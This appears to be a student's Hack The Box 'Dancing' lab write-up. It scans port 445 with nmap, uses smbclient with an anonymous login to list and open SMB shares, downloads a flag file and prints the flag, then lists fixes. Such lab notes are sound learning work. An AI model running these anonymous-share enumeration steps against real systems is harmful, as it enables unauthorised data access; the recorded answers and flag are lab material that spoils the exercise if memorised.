---
id: starting_point_dancing
aliases: []
tags:
  - protocols
  - smb
  - reconnaissance
  - anonymous/guest_access
date: "2025-01-23"
---

# HTB_starting_point_meow

- Platform: Hack The Box
- Category:CTF
- Difficulty: Very Easy
- Estimated Time: Under 10 minutes

---

## 💡 **Objective**

- What does the 3-letter acronym SMB stand for? `Server Message Block`
- What port does SMB use to operate at?`445`
- What is the service name for port 445 that came up in our Nmap scan?`microsoft-ds`
- What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?`-L`
- How many shares are there on Dancing?`4`
- What is the name of the share we are able to access in the end with a blank password?`WorkShares`
- What is the command we can use within the SMB shell to download the files we find?`get`
- Submit root flag
  ```bash
  5f61c10dffbc77a704d76016a22f1664
  ```

---

## 🛠️ **Preparation**

- **Tools Used:** [nmap, smbclient]
- **Environment:** [Arch Linux]
- **Commands to Remember:**

  - Listing Share yang tersedia
    ```bash
    smbclient -L 10.129.145.2
    ```
  - Login ke share tertentu
    ```bash
    smbclient //10.129.145.2/WorkShares -U anonymous
    ```
  - Scan port 445
    ```bash
    sudo nmap -sV -p 445 -oN starting_point_fawn.txt 10.129.145.2
    ```

---

## 🔍 **Enumeration**

- **Initial Reconnaissance:**
  - Target IP/URL: `10.129.145.2`
  - Open Ports/Services:
    ```plaintext
    PORT    STATE SERVICE       VERSION
    445/tcp open  microsoft-ds?
    ```
  - ## Vulnerabilities Identified:
- **Detailed Findings:**
  - Anonymous SMB Access Misconfiguration

---

## 🧩 **Exploitation**

- **Steps Taken:**

  1. Scanning IP with nmap

  ```bash
  # Nmap 7.95 scan initiated Thu Jan 23 21:13:36 2025 as: nmap -sV -p 445 -oN starting_point_dancing_445.txt 10.129.145.2
  Nmap scan report for 10.129.145.2
  Host is up (0.35s latency).

  PORT    STATE SERVICE       VERSION
  445/tcp open  microsoft-ds?

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Thu Jan 23 21:14:06 2025 -- 1 IP address (1 host up) scanned in 29.44 seconds
  ```

  2. Identifying open ports: 445/tcp microsoft-ds -> SMB
  3. Listing Share that available

  ```bash
  ❯ smbclient -L 10.129.145.2 -U anonymous
  Can't load /etc/samba/smb.conf - run testparm to debug it
  Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
  SMB1 disabled -- no workgroup available
  ```

  4. Connect to the Share, with the username `anonymous`

  ```bash
  ❯ smbclient //10.129.145.2/WorkShares -U anonymous
  Can't load /etc/samba/smb.conf - run testparm to debug it
  Password for [WORKGROUP\anonymous]:
  Try "help" to get a list of possible commands.
  smb: \> ls
  .                                   D        0  Mon Mar 29 15:22:01 2021
  ..                                  D        0  Mon Mar 29 15:22:01 2021
  Amy.J                               D        0  Mon Mar 29 16:08:24 2021
  James.P                             D        0  Thu Jun  3 15:38:03 2021

                5114111 blocks of size 4096. 1752908 blocks available
  ```

  5. Find Flag

  ```bash
  smb: \> cd James.p
  smb: \James.p\> ls
  .                                   D        0  Thu Jun  3 15:38:03 2021
  ..                                  D        0  Thu Jun  3 15:38:03 2021
  flag.txt                            A       32  Mon Mar 29 16:26:57 2021

                5114111 blocks of size 4096. 1753240 blocks available
  ```

  6. Download the flag

  ```bash
  smb: \James.p\> get flag.txt
  getting file \James.p\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
  ```

  7. cat the flag
     `5f61c10dffbc77a704d76016a22f1664`

- **Challenges Faced:**
  - Know that microsoft-ds is a services for SMB
  - download the file, using `get` command
  - understand the smbclient options, -L, -U

---

## 🚀 **Post-Exploitation**

- **Access Gained:**
  - User: [user]
  - Privileges: [limited]
- **Privilege Escalation Steps:**
  - Not use escalation, just get the flag

---

## 📝 **Key Learnings**

- **What I Learned:**
  - Connecting to the target with smb port 445, using anonymous username.
  - Scanning port spesific using new options in nmap -p: scan port
    ```bash
    sudo nmap -sV -p 445 -oN starting_point_fawn.txt 10.129.145.2
    ```
- **Mistakes to Avoid:**
  - No Read the manual/documentation

---

## 🔧 **How To Fix Vulnerabilities**

- **Vulnearbilties Encountered:**

  - Vuln:
    - Anonymous login is enabled
  - Fix:
    - Deactivate anonymous login
    - Restricted SMB Sharing Access
    - Use strong authentication
    - Firewall Rules
    - Monitor the logs
    - Update Software FTP

- ## **Helpful Resources:**
  - [Pengertian SMB](https://puskom.uma.ac.id/2022/12/server-message-block-protocol-smb-protocol)

---

## 🎯 **Post-Lab Reflection**

- **How Could I Improve?**
  - Improve the nmap scan options using -p
- **Next Steps:**
  - Practice how to activate or deactivate SMB services
